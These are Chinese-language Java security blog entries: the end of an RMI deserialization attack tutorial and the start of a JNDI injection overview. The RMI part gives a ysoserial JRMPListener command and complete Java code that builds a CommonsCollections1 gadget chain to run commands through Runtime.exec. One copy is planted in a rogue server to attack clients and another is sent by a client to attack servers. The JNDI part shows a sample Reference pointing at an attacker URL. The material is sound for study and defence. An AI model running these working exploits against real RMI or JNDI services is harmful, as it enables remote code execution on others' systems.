alt="image-20250713235837976"></p><h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>原理就是因为在发起请求后，RegistryImpl_Stub会将请求序列化发送给注册中心RegistryImpl_Skel来进行处理，而除了unbind和rebind都会返回数据给客户端，返回的数据也是经过序列化的，所以到客户端后就会进行反序列化。如果我们能控制注册中心返回数据，就能实现攻击。</p><p>可以使用ysoserial的JRMPListener来进行演示</p><p>工具地址：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/frohoff/ysoserial</span></span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure><p>客户端访问：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h4><p>服务端攻击客户端，通过 服务端返回Object对象 来攻击</p><p>当执行远程方法时，传递回来不一定是基础数据类型（String，int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要进行对应的反序列化操作。</p><p>我们需要伪造一个服务器，当客户端调用某个远程方法时，返回的参数是我们的恶意对象：</p><p>RMIInterface接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMItest:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object o=(InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的不用变</p><p><img src="/archives/9738c3bd/image-20250714002250598.png" alt="image-20250714002250598"></p><h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="注册中心攻击服务端"><a href="#注册中心攻击服务端" class="headerlink" title="注册中心攻击服务端"></a>注册中心攻击服务端</h4><p>与攻击客户端一样，原理都是当调用与注册中心交互的方法时如果从注册中心返回的数据可控，那么可以构造恶意的数据客户端进行反序列化造成攻击</p><h4 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h4><p>当服务端的某个方法接受的参数是Object对象时，那么当客户端调用远程对象的方法传入恶意的Object对象，服务端在接受时会先将对象进行反序列化从而造成攻击</p><p>远程接口RMIInterface：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端RMItest：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Great!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端Client：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object evil=(InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line">        RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br><span class="line">        <span class="comment">//调用远程对象的方法</span></span><br><span class="line">        o.Hello(evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/9738c3bd/image-20250714092044909.png" alt="image-20250714092044909"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>下面是对rmi利用中jdk版本时间线的一个总结，也是后面要涉及的：</p><ol><li>从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的payload指的是ysoserial修改后的JRMPClient。</li><li>从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击方式开始失效。</li><li>从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/CoLo/p/15468660.html">https://www.cnblogs.com/CoLo/p/15468660.html</a></p><p><a href="https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164#bf438eb4ecbd4c7c8aa60abf6e5ed450">https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164#bf438eb4ecbd4c7c8aa60abf6e5ed450</a></p><p><a href="https://paper.seebug.org/1194/">https://paper.seebug.org/1194/</a></p><p><a href="https://www.jianshu.com/p/de85fad05dcb">https://www.jianshu.com/p/de85fad05dcb</a></p><p><a href="https://www.freebuf.com/articles/web/340633.html">https://www.freebuf.com/articles/web/340633.html</a></p><p><a href="https://mp.weixin.qq.com/s/BEctzUsH7HfkY8EEJ6yg9g">https://mp.weixin.qq.com/s/BEctzUsH7HfkY8EEJ6yg9g</a></p><p><a href="https://mp.weixin.qq.com/s/qiI7Mh4P-xTqY11Fy35-uA">https://mp.weixin.qq.com/s/qiI7Mh4P-xTqY11Fy35-uA</a></p><p><a href="https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#Evwbq">https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#Evwbq</a></p><p><a href="https://www.cnblogs.com/erosion2020/p/18568890">https://www.cnblogs.com/erosion2020/p/18568890</a></p><p><a href="https://www.freebuf.com/articles/web/324692.html">https://www.freebuf.com/articles/web/324692.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> Java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java JNDI注入总结</title>
      <link href="/archives/be65d471/"/>
      <url>/archives/be65d471/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JNDI(Java Naming Directory Interface)，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。</p><p>JNDI可访问的现有目录及服务包括：JDBC（Java数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请求代理系统结构）</p><h2 id="命名服务-目录服务"><a href="#命名服务-目录服务" class="headerlink" title="命名服务&#x2F;目录服务"></a>命名服务&#x2F;目录服务</h2><p>JNDI包括命名服务（Naming Service）和目录服务（Directory Service）。</p><h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>是一种通过名称来查找实际对象的服务。例如在RMI中，Naming.lookup方法通过查找名称来获取远程对象的代理类</p><p>相关概念：</p><ul><li>Name：名称。要么在命名系统中查找对象，需要提供对象的名称，如<code>java:comp/env/jdbc/DataSource</code></li><li>Naming Convention：命名规范。一个命名系统中的所有名称必须遵循的语法规范</li><li>Binding：绑定。一个名称和一个对象的关联，如<code>bind(&quot;payService&quot;, paymentObj)</code></li><li>Reference：引用。一些命名服务系统不是直接存储对象，而是保存对象的引用。引用包含了如何访问实际对象的信息。如<code>&lt;Reference class=&quot;com.Evil&quot; url=&quot;http://attacker/&quot;/&gt;</code></li><li>Address：地址。引用通常用一个或多个地址（通信端口）来表示，如<code>ldap://192.168.1.1:389</code></li><li>Context：上下文。一个上下文是一系列名称和对象的绑定的集合。一个上下文中的名称可以绑定到一个具有相同命名规范的上下文中，称之为子上下文(subcontext)。例如：在文件系统中，&#x2F;usr是一个Context，&#x2F;usr&#x2F;bin是usr的subcontext</li><li>Naming System：命名系统。一个相同类型的上下文集合，例如整个 DNS 系统</li><li>Namespace：命名空间。一个命名系统的所有名称的集合，例如DNS的所有域名</li><li>Atomic Name：原子名。一个简单基本结构，如文件名 <code>config.txt</code></li><li>Compound Name：混合名。由多个原子名一起构成的名称，如文件路径 <code>/home/user/.bashrc</code></li><li>Composite Name：复合名称。是跨越多个命名系统的名称，如<code>ldap://ldap.com/cn=user,dc=com+file:/shared.txt</code></li></ul><h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称为目录对象，目录对象可以跟属性关联，一个目录是由相关联的目录对象组成的系统。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p><p>相关概念：</p><ul><li>Attribute：属性。一个目录对象可以包含属性。一个属性具有一个属性标识符和一系列属性值</li><li>Search Filter：查找过滤器。通常还提供通过目录对象的属性来查找对象的操作，这种的查找一般通过规定的表达式来表示，称之为查找过滤器。</li></ul><h2 id="JNDI简单利用"><a href="#JNDI简单利用" class="headerlink" title="JNDI简单利用"></a>JNDI简单利用</h2><h3 id="RMI示例"><a href="#RMI示例" class="headerlink" title="RMI示例"></a>RMI示例</h3><h4 id="开启RMI服务"><a href="#开启RMI服务" class="headerlink" title="开启RMI服务"></a>开启RMI服务</h4><p>远程接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//注册RMI端口</span></span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line">        <span class="comment">//绑定远程对象</span></span><br><span class="line">        RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br><span class="line">        Naming.rebind(RMI_NAME,o);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务在：&quot;</span>+RMI_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250715165542968.png" alt="image-20250715165542968"></p><h4 id="设置JNDI环境参数"><a href="#设置JNDI环境参数" class="headerlink" title="设置JNDI环境参数"></a>设置JNDI环境参数</h4><p>在访问JNDI目录服务时会通过预先设置好环境变量访问对应的服务，这里主要通过Context接口实现的，在Context接口中定义的变量，分别用到了<code>INITIAL_CONTEXT_FACTORY</code>和<code>PROVIDER_URL</code>：</p><ul><li><p><code>INITIAL_CONTEXT_FACTORY</code>：保存环境属性名称的常量，用于指定要使用的<strong>初始上下文工厂</strong>，即指定 JNDI 服务提供者的入口类。</p><p><img src="/archives/be65d471/image-20250715172450950.png" 